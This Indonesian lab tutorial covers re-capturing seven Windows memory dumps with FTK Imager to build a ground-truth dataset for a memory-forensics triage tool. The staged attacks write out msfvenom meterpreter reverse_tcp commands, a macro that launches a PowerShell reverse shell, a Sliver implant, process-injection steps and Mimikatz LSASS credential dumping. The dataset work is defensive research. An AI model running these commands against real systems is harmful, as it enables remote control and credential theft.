# Tutorial Capture Ulang 7 Dump via FTK Imager (.mem) — Lengkap

> Metode akuisisi: **FTK Imager > Capture Memory** (output `.mem`), sesuai SOP
> Tim LFD BSSN (hasil diskusi analis, 14 Juli 2026). Tujuan: hasil dataset lebih
> mirip praktik LFD dan berformat `.mem`.
>
> Cakupan: **7 dump utama @ ~5 GB** (clean + 6 rule). Semua parameter serangan
> SAMA seperti dataset FINAL sebelumnya (dataset_design.md); yang berubah HANYA
> cara akuisisi (FTK Imager, bukan DumpIt/.vmem) dan ekstensi output (.mem).
>
> Platform TIDAK perlu diubah: analyzer membaca isi raw memory, ekstensi bebas
> (.mem dibaca sama seperti .raw). Sudah dikonfirmasi di kode (main.py menerima
> path apa pun).

---

## ⚠️ CATATAN JUJUR SEBELUM MULAI (baca sekali)

1. **FTK Imager berjalan DI DALAM victim.** Konsekuensinya, di setiap dump akan
   muncul proses `FTK Imager.exe` (dan mungkin `AccessData` service). Ini WAJAR
   dan JUJUR ditulis: tool akuisisi memang ikut terekam pada live acquisition.
   Bukan cacat, justru realistis (LFD pun begitu). Pastikan proses ini TIDAK
   ter-flag SUSPICIOUS keliru (ia jalan dari Program Files, path sah -> aman).

2. **Risiko dump besar tidak berlaku di sini** karena 7 dump ini @ ~5 GB (RAM VM
   kecil). Masalah dump-tak-utuh dulu hanya muncul di 12/20 GB. Untuk uji skala
   besar, JANGAN pakai FTK (tetap .vmem). Tutorial ini KHUSUS 7 dump 5 GB.

3. **Kamu akan menjalankan ulang + verifikasi ulang analyzer untuk ketujuhnya.**
   Setelah semua .mem jadi, hasil TP/FP lama (raw) digantikan hasil baru (.mem).
   Idealnya hasil tetap: TP di tiap rule, clean ~1 FP (Paint3D) atau lebih bersih.
   Kalau ada perbedaan, catat (bukan disembunyikan).

4. **Verifikasi kelengkapan dump WAJIB** sebelum dump dipakai (langkah V di tiap
   dataset): `windows.pslist` harus mengembalikan >= 120 proses. Kalau < 100,
   dump kemungkinan tak utuh -> ulang capture.

---

## BAGIAN 0 — Prasyarat & Install FTK Imager (SEKALI, di snapshot dasar)

Tujuan: install FTK Imager SATU KALI di snapshot bersih, SEBELUM menanam malware,
supaya footprint instalasi seragam di semua dataset dan tidak mengotori ground
truth.

- [ ] **0.1.** Restore snapshot bersih victim (Win10 22H2 19045.2965).
- [ ] **0.2.** Unduh FTK Imager (installer standalone) dari sumber resmi Exterro/
      AccessData. Karena victim host-only tanpa internet, unduh di host lalu
      pindahkan ke VM lewat shared folder / drag-drop VMware Tools / ISO.
      (Versi mana pun yang punya menu **File > Capture Memory** cocok.)
- [ ] **0.3.** Install FTK Imager di victim (Next-Next-Finish, path default
      `C:\Program Files\AccessData\FTK Imager\`).
- [ ] **0.4.** Jalankan FTK Imager sekali untuk memastikan menu **File > Capture
      Memory...** ada. Tutup lagi.
- [ ] **0.5.** Siapkan folder output di victim, mis. `C:\Capture\` (biar rapi,
      terpisah dari path yang dipakai skenario serangan `C:\Users\Public\` dll).
- [ ] **0.6.** Ambil snapshot BARU bernama `clean-base-ftk` (bersih + FTK
      terpasang). INI titik restore untuk semua 7 dataset. Dengan begitu FTK
      terpasang seragam di semua dump, dan tiap dataset mulai dari kondisi
      identik.

> Kenapa install DULU baru snapshot: kalau FTK diinstal setelah malware ditanam,
> proses instalasi (msiexec, unpack) ikut ada di dump dan beda-beda tiap dataset.
> Dengan install di base, semua dataset punya footprint FTK yang sama.

---

## BAGIAN 1 — Prosedur Akuisisi FTK Imager (GENERIK, dipakai semua dataset)

Ini langkah capture memory-nya. Sama untuk ketujuh dataset; yang beda hanya
skenario yang dijalankan SEBELUM capture (Bagian 2) dan nama file output.

- [ ] **CAP-1.** Pastikan skenario dataset sudah aktif & resident (lihat Bagian 2
      untuk tiap dataset). Untuk skenario dengan C2/handle (r1b, r2, r4b), capture
      dilakukan SELAGI koneksi/handle masih hidup.
- [ ] **CAP-2.** Buka FTK Imager (Run as Administrator).
- [ ] **CAP-3.** Menu **File > Capture Memory...**
- [ ] **CAP-4.** Di dialog:
      - Destination path: `C:\Capture\`
      - Destination filename: `<nama_dataset>.mem` (lihat tabel nama di bawah)
      - **JANGAN** centang "Include pagefile" (kita hanya mau RAM, konsisten
        dengan dataset lama).
      - **JANGAN** centang "Create AD1 file" (kita mau raw .mem, bukan wadah AD1).
- [ ] **CAP-5.** Klik **Capture Memory**. Tunggu progress 100% (Memory capture
      finished). Untuk ~5 GB biasanya cepat.
- [ ] **CAP-6.** JANGAN tutup skenario dulu. Lanjut verifikasi (Bagian per-dataset
      langkah V). Kalau perlu, pindahkan `.mem` ke host/WSL:
      `C:\Capture\<nama>.mem` -> `/mnt/d/forensic_triase/dataset_update/<nama>.mem`
      (lewat shared folder VMware).

### Tabel nama file output

| Dataset | Nama file .mem |
|---|---|
| 1 clean | `clean_baseline.mem` |
| 2 r1a masquerade | `infected_r1a_masquerade.mem` |
| 3 r1b parent-child | `infected_r1b_parentchild.mem` |
| 4 r2 network | `infected_r2_network.mem` |
| 5 r3 injection | `infected_r3_injection.mem` |
| 6 r4a dll | `infected_r4a_dll.mem` |
| 7 r4b lsass | `infected_r4b_lsass.mem` |

### Verifikasi kelengkapan (GENERIK, jalankan untuk SETIAP dump di WSL)

```
cd /home/kevin/forensic_triase/platform
vol -f /mnt/d/forensic_triase/dataset_update/<nama>.mem windows.pslist 2>/dev/null | tail -n +2 | wc -l
```
- Harus **>= 120**. Kalau < 100 -> dump tak utuh -> ulangi CAP.
- Lalu jalankan analyzer: `python3 main.py /mnt/d/forensic_triase/dataset_update/<nama>.mem`
- Cek hasil sesuai "Expected" tiap dataset.

---

## BAGIAN 2 — Prosedur per Dataset (skenario SAMA seperti versi FINAL)

Environment umum SEMUA dataset infected: victim 192.168.70.130, Kali
192.168.70.131, host-only tanpa internet, IP statis. Restore `clean-base-ftk`
sebelum tiap dataset. Semua parameter serangan identik dataset_design.md — yang
berubah cuma akuisisi (FTK) & ekstensi (.mem).

---

### DATASET 1 — clean_baseline.mem  (ground truth: SEMUA CLEAN)

- [ ] Restore `clean-base-ftk`. Boot, tunggu CPU idle < 10%.
- [ ] Jalankan aktivitas realistis (level Sedang, seperti dataset asli):
      Edge 3-4 tab, Word/Excel buka 1 dokumen, VS Code buka 1 folder, app
      portable (PuTTY/7-Zip) dari `Downloads\`, Python interpreter (JANGAN panggil
      shell), PDF reader/Explorer/Notepad, biarkan Defender/Search/OneDrive
      default.
- [ ] Diamkan 2-3 menit.
- [ ] **CAP** (Bagian 1) -> `clean_baseline.mem`.
- [ ] **V (Expected):** SUSPICIOUS idealnya 0. Kalau muncul FP (dulu Paint3D via
      R2, IP Azure) -> WAJAR, dokumentasikan (sensitivitas > spesifisitas), JANGAN
      dibuang. Pastikan `FTK Imager.exe` TIDAK ter-flag (path Program Files sah).

> Catatan: karena kini FTK terpasang & mungkin dijalankan, cek apakah proses baru
> (FTK, AccessData service) memicu rule apa pun. Harusnya tidak. Kalau iya, catat
> sebagai temuan (kandidat whitelist LEGIT_* atau bahan Bab Keterbatasan).

---

### DATASET 2 — infected_r1a_masquerade.mem  (R1a primer)

Skenario (MITRE T1036.005, Q13 #1):
- [ ] Kali: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.70.131
      LPORT=4444 -f exe -o svch0st.exe`. Serve via `python3 -m http.server 8000`.
      Handler `multi/handler` reverse_tcp :4444.
- [ ] Victim: unduh & taruh sebagai `C:\Users\Public\svch0st.exe`. Jalankan.
- [ ] Konfirmasi sesi meterpreter terbuka (C2 aktif).
- [ ] Catat ground truth: `tasklist | findstr svch0st` -> PID.
- [ ] **CAP** selagi C2 aktif -> `infected_r1a_masquerade.mem`.
- [ ] **V (Expected):** `svch0st.exe` SUSPICIOUS, R1=True (typosquatting edit
      distance 1 dari svchost.exe + path `\users\public\`). Mungkin ikut R2/R3
      (C2/shellcode meterpreter) = sekunder organik, WAJAR.

---

### DATASET 3 — infected_r1b_parentchild.mem  (R1b primer)

Skenario (MITRE T1059.001, Q13 #6) — rantai `soffice.bin -> powershell.exe`:
- [ ] Kali: siapkan listener nc `:4444` (reverse shell). Payload `p.ps1` = plain
      PowerShell TCP reverse shell ke `192.168.70.131:4444`. Taruh `p.ps1` di
      `C:\Users\Public\`.
- [ ] Victim: buka dokumen LibreOffice ber-makro. Makro (LibreOffice Basic):
      `CreateObject("WScript.Shell").Run("powershell -nop -ep bypass -File C:\Users\Public\p.ps1", 1, False)`.
- [ ] Jalankan makro -> `soffice.bin` men-spawn `powershell.exe` (anak langsung).
      Reverse shell masuk ke nc listener.
- [ ] Catat ground truth: PID `soffice.bin` (spawner) + PID `powershell.exe`
      (anak, PPID = soffice) via `Get-CimInstance Win32_Process` atau tasklist.
- [ ] **CAP** selagi shell aktif -> `infected_r1b_parentchild.mem`.
- [ ] **V (Expected):** `soffice.bin` SUSPICIOUS R1=True (Spawn mencurigakan ->
      powershell.exe). `powershell.exe` ikut R2 (C2 :4444) + R3 (RWX) = sekunder
      organik. Pastikan tak ada PowerShell liar sisa troubleshooting (Stop-Process
      dulu bila ada).

---

### DATASET 4 — infected_r2_network.mem  (R2 primer, ISOLASI MURNI)

Skenario (MITRE T1071.001, Q13 #4) — implant **Sliver** (Go, zero RWX):
- [ ] Kali: generate implant Sliver mTLS, listener `:8443`. Nama `AtlasAgent.exe`.
- [ ] Victim: taruh di `C:\Program Files\AtlasSync\AtlasAgent.exe` (path SAH ->
      R1/R4a diam). Jalankan via **double-click Explorer** (parent explorer.exe ->
      R1b diam). JANGAN post-exploitation (tanpa shell/execute/migrate -> R3 diam).
- [ ] Konfirmasi C2 ESTABLISHED: victim `netstat -ano | findstr 8443`.
- [ ] Catat ground truth: PID `AtlasAgent.exe`, PPID explorer, ForeignAddr
      `192.168.70.131:8443`.
- [ ] **CAP** selagi C2 ESTABLISHED -> `infected_r2_network.mem`.
- [ ] **V (Expected):** `AtlasAgent.exe` SUSPICIOUS, **R2=True saja**, R1=R3=R4=
      False (isolasi R2). Tak muncul di malfind (Sliver zero RWX).

---

### DATASET 5 — infected_r3_injection.mem  (R3 primer, ISOLASI MURNI)

Skenario (MITRE T1055.001, Q13 #2) — meterpreter reflective DLL -> notepad:
- [ ] Prasyarat: Defender Real-time protection OFF (meterpreter mentah kena
      signature). Sah sebagai prasyarat lab (setara T1562.001).
- [ ] Kali: `msfvenom` meterpreter reverse_tcp -> `AtlasHelper.exe`. Serve http.
      Handler `multi/handler` :4444.
- [ ] Victim: buka `notepad.exe` via Explorer (parent explorer -> R1b diam). Catat
      PID notepad.
- [ ] Victim: unduh & jalankan `AtlasHelper.exe` -> sesi meterpreter.
- [ ] Kali meterpreter: `migrate <PID notepad>` -> `Migration completed`. Stager
      `AtlasHelper.exe` mati otomatis (tanpa noise).
- [ ] Kali: `sleep 300` (socket C2 tertutup -> R2 diam). Kode injeksi tetap
      resident (RWX di notepad).
- [ ] Catat ground truth: `notepad.exe` PID, PPID explorer, 2 segmen RWX.
- [ ] **CAP** dalam jendela sleep (tanpa ESTABLISHED) -> `infected_r3_injection.mem`.
- [ ] **V (Expected):** `notepad.exe` SUSPICIOUS, **R3=True saja**, R1=R2=R4=False
      (isolasi R3). malfind: 2 segmen PAGE_EXECUTE_READWRITE + PrivateMemory.

---

### DATASET 6 — infected_r4a_dll.mem  (R4a primer, ISOLASI MURNI)

Skenario (MITRE T1574.001/002 + T1218.011, Q13 #3) — rundll32 muat evil.dll:
- [ ] Prasyarat: Defender boleh ON (DLL benign, tak kena signature).
- [ ] Kali: cross-compile `evil.dll` (`x86_64-w64-mingw32-gcc -shared`, 64-bit,
      hanya MessageBox -> menahan proses resident). Serve http.
- [ ] Victim: unduh `evil.dll` ke `C:\Users\Public\`. Muat:
      `rundll32.exe C:\Users\Public\evil.dll,Run` (dari cmd). MessageBox muncul
      (jangan ditutup -> rundll32 resident).
- [ ] Catat ground truth: `rundll32.exe` PID (PPID cmd.exe), modul `evil.dll` @
      `C:\Users\Public\evil.dll`.
- [ ] **PENTING (temuan capture pertama):** TUTUP jendela PowerShell unduhan bila
      ada (CLR .NET JIT bikin RWX benign -> R3 FP). Pastikan tak ada powershell
      sah menganggur saat capture.
- [ ] **CAP** selagi MessageBox/rundll32 resident -> `infected_r4a_dll.mem`.
- [ ] **V (Expected):** `rundll32.exe` SUSPICIOUS, **R4a=True saja**, R1=R2=R3=
      False (isolasi R4a). Reason: memuat evil.dll dari `\users\public\`.

---

### DATASET 7 — infected_r4b_lsass.mem  (R4b primer, ISOLASI MURNI)

Skenario (MITRE T1003.001, Q13 #5) — Mimikatz akses LSASS:
- [ ] Victim: taruh `mimikatz.exe` di `C:\Program Files\Mimikatz\` (path SAH ->
      R1/R4a diam).
- [ ] Victim: jalankan mimikatz interaktif -> `privilege::debug` ->
      `sekurlsa::logonpasswords`. BIARKAN prompt mimikatz TERBUKA (handle LSASS
      tetap terpegang di prompt interaktif -> andal ditangkap).
- [ ] Catat ground truth: `mimikatz.exe` PID pemegang handle ke `lsass.exe` PID.
- [ ] **CAP** SELAGI prompt mimikatz aktif (handle terbuka) ->
      `infected_r4b_lsass.mem`.
- [ ] **V (Expected):** `mimikatz.exe` SUSPICIOUS, **R4b=True saja**, R1=R2=R3=
      False (isolasi R4b). GrantedAccess mengandung bit PROCESS_VM_READ (0x0010).
      14 handle System/csrss/lsass-self ditekan whitelist -> hanya mimikatz lolos.

---

## BAGIAN 3 — Setelah 7 dump jadi: regresi & sinkron dokumen

- [ ] **R1.** Jalankan `python3 main.py <dump>.mem` untuk ketujuhnya, catat hasil
      (TP/FP/FN per dataset) di tabel baru.
- [ ] **R2.** Jalankan `regression_test.py` bila ia menunjuk ke dataset baru
      (sesuaikan path ke `.mem`). Bandingkan agregat lama (TP=7/7, FP=1, FN=0).
- [ ] **R3.** Update `dataset_design.md`: ganti catatan akuisisi "DumpIt" ->
      "FTK Imager (.mem)" pada tiap dataset yang di-recapture, dan tanggal capture
      baru. Ini kerja dokumentasi, JUJUR menulis metode akuisisi baru.
- [ ] **R4.** Kalau hasil berubah (mis. FP hilang/bertambah), catat apa adanya.
      JANGAN paksa cocok dengan angka lama.

---

## BAGIAN 4 — Jaring pengaman jadwal (tenggat 15 Juli)

Capture + verifikasi 7 dump itu berat. Kalau waktu mepet:
- Prioritas jalur kritis tetap UAT + penulisan bab (sudah selesai).
- Kalau lab meleset, dataset `.vmem`/`.raw` FINAL yang lama MASIH VALID sebagai
  cadangan (hasil TP=7/7 terdokumentasi). FTK adalah peningkatan kesesuaian LFD,
  bukan syarat kelulusan.
- Urutan aman bila tak sanggup semua: clean_baseline + r4b (paling representatif
  untuk demo LFD) dulu, sisanya menyusul pasca-tenggat bila perlu.
```
